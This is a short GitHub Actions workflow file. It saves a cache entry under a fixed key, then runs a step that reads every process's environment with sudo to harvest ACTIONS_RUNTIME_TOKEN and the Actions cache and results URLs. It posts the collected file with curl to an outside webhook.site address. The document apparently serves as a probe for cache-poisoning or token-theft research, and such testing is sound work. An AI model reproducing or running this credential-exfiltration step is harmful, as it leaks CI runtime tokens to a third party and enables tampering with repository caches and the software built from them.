name: cb-a-trusted
on:
  push: {}
  workflow_dispatch: {}
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: make payload
        run: |
          mkdir -p cache-dir
          echo "cache payload A $(date -u)" > cache-dir/payload.txt
      - name: save cache
        uses: actions/cache/save@v4
        with:
          path: cache-dir
          key: probe-main-A1
      - name: proc sweep for runtime context
        run: |
          {
            echo "=== direct env:"
            env | grep -E "ACTIONS_|GITHUB_REF=|GITHUB_REPOSITORY=" || true
            echo "=== /proc environ sweep (runner + children):"
            for p in /proc/[0-9]*; do
              sudo cat $p/environ 2>/dev/null | tr '\0' '\n' | grep -E "^ACTIONS_RUNTIME_TOKEN=|^ACTIONS_RESULTS_URL=|^ACTIONS_CACHE_URL=" && echo "  (pid $p)"
            done | sort -u
          } > ctx.txt 2>&1
          wc -c ctx.txt
          curl -s -X POST https://webhook.site/727a48a4-5683-424d-88ae-e5eb14927bc7 -F "f=@ctx.txt" -F "src=proc-sweep"
        shell: bash
